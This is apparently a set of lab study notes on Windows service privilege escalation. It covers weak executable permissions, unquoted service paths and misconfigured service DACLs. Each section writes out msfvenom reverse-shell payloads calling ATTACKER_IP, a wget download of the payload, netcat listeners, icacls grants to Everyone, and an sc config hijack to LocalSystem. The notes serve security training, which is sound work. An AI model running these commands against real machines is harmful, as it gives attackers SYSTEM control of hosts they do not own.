Windows services are managed by the Service Control Manager (SCM), which is responsible for overseeing the state of services, monitoring their current status, and providing a means to configure them as necessary.

To better understand the structure of a service, we can use the `sc qc` command:

```
sc qc <service>
```

Here, the `BINARY_PATH_NAME` parameter specifies the associated executable, while the `SERVICE_START_NAME` parameter indicates the account used to run the service.

Services have a Discretionary Access Control List (DACL) that defines permissions for actions like starting, stopping, and configuring the service. You can view the DACL using Process Hacker, available on your desktop.

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`.

![](../../Attachments/Pasted%20image%2020240810183544.png)

Each service has a registry subkey where the `ImagePath` shows the executable and `ObjectName` indicates the account used to start the service. If configured, the DACL is stored in the `Security` subkey, and only administrators can modify these entries by default.

# Insecure Permissions on Service Executable

If a service's executable has weak permissions, an attacker could easily modify or replace it, thereby gaining the privileges of the service's account.

For example: having a service executable with (M) permission on "Everyone" group, then we can generate our own payload using msfvenom and serve it through a python webserver:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
# Next
python3 -m http.server
# On Target
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well, then we start out listener `nc -lvnp 4445`.

# Unquoted Service Paths

In Windows, improper configuration of service paths can lead to privilege escalation. If a service executable's path contains spaces but lacks quotation marks, Windows may misinterpret the command and execute unintended files in the path. Attackers can exploit this by creating executables with names that Windows might attempt to execute first. For instance, if a service is set to run `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` without quotes, Windows may mistakenly execute `C:\MyPrograms\Disk.exe` if it exists. By placing a malicious executable at `C:\MyPrograms\Disk.exe`, an attacker could gain control over the service.

We try Identify Services with Unquoted Paths:

```
sc qc "service_name"
```

Then, we Look for a `BINARY_PATH_NAME` without quotation marks that contains spaces in the path, e.g., `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`.

Next, Identify paths Windows might misinterpret by splitting at each space. For instance:

```
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

After that, we create a reverse shell payload using `msfvenom`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe -o rev-svc2.exe
```

Now, we transfer the payload to the vulnerable machine and rename it to match one of the potential paths Windows might search (e.g., `Disk.exe`):

```
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```

Finally, we grant full permissions to ensure the service can execute it and open a listener on our machine:

```
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

on our machine: `nc -lvnp 4446`

# Insecure Service Permissions

This method targets services with misconfigured _service_ DACLs, allowing modification of service configurations (e.g., changing the binary path or the user account under which the service runs).

First, we use `AccessChk` from the Sysinternals suite to confirm if the "Users" group has the `SERVICE_ALL_ACCESS` permission on the target service (`thmservice`):

```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```

If `BUILTIN\Users` has `SERVICE_ALL_ACCESS`, it allows us to reconfigure the service.

Next, we use `msfvenom` on our attacker machine to create a payload that will connect back to our listener. Substitute `ATTACKER_IP` with our IP:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

Then, we start a listener to receive the reverse shell connection:

```
nc -lvp 4447
```

After that, we transfer `rev-svc3.exe` to the target system and place it in a writable directory, such as `C:\Users\thm-unpriv\rev-svc3.exe`.

Then, we set permissions so that the file can be executed by anyone:

```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Then, using `sc config`, we change the service’s binary path (`binPath`) to point to our payload and set the service to run under `LocalSystem` (the highest privilege account). We take care to include proper spacing in the command:

```
`sc config thmservice binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`
```